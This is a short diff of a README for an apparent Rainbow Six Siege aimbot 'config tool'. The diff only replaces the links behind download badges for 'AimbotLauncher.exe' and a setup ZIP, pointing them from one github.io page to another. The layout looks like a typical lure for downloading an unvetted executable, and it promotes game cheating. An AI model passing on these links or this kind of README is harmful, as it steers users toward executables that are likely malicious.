@@ -1,7 +1,7 @@
 # 🎯 Rainbow Six Siege Aimbot — Precision Assist Config Tool
 
-[![Download AimbotLauncher.exe](https://img.shields.io/badge/Download-AimbotLauncher.exe-green?style=for-the-badge)](https://rainbow-six-siege-aimbot-config-tool.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://rainbow-six-siege-aimbot-config-tool.github.io/.github/)
+[![Download AimbotLauncher.exe](https://img.shields.io/badge/Download-AimbotLauncher.exe-green?style=for-the-badge)](https://jackson8149766.github.io/.github/rainbow-six-siege-aimbot)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://jackson8149766.github.io/.github/rainbow-six-siege-aimbot)
 
 ---
 
